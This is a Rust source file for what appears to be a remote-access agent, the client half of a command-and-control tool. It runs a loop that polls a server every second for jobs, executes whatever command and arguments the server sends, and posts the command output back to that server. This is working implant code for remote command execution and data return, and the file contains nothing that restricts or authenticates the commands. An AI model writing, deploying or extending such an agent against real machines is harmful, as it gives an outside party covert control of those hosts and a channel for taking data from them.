use std::process::Command;
use std::time::Duration;

use reqwest::Client;
use tokio::time::sleep;
use uuid::Uuid;
use serde::{Deserialize, Serialize};

use crate::{config, error::Error};
use crate::init::Response;

#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct AgentJob {
    pub id: Uuid,
    pub command: String,
    pub args: Vec<String>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct UpdateJobResult {
    pub job_id: Uuid,
    pub output: String,
}

pub async fn run(client: &Client, agent_id: Uuid) -> ! {
    let sleep_time = Duration::from_secs(1);
    let job_url = format!("{}/api/jobs/{}", config::SERVER_URL, agent_id);
    let job_result_url = format!("{}/api/jobs/result", config::SERVER_URL);

    loop {
       let job = match get_job(&client, &job_url).await {
            Ok(job) => job,
            Err(err) => {
                println!("{err}");
                sleep(sleep_time).await;
                continue;
            },
        };
        let output = executed_command(job.command, job.args);
        let job_result = UpdateJobResult {
            job_id: job.id,
            output
        };
        match post_result(&client, &job_result_url, job_result).await {
            Ok(_) => {},
            Err(err) => { println!("{err}"); },
        };
        sleep(sleep_time).await;
        continue;
    }
}

async fn get_job(client: &Client, job_url: &String) -> Result<AgentJob, Error> {
    
    let resp = client
        .get(job_url)
        .send()
        .await?
        .json::<Response<AgentJob>>()
        .await?;

    let agent_job = match resp.data {
        Some(agent_job) => Ok(agent_job),
        None => Err(Error::Internal("job data is null".to_string())),
    }?;

    Ok(agent_job)
}

fn executed_command(command: String, args: Vec<String>) -> String {
    let mut ret = String::new();
    let output = match Command::new(command).args(&args).output() {
        Ok(output) => output,
        _ => return ret,
    };

    ret = match String::from_utf8(output.stdout) {
        Ok(stdout) => stdout,
        _ => return ret,
    };

    ret
}

async fn post_result(
    client: &Client,
    job_result_url: &String, 
    job_result: UpdateJobResult,
) -> Result<bool, Error> {
    let resp = client
        .post(job_result_url)
        .json(&job_result)
        .send()
        .await?
        .json::<Response<bool>>()
        .await?;

    match resp.data {
        Some(ok) => Ok(ok),
        None => Err(Error::Internal("job data is null".to_string())),
    }
}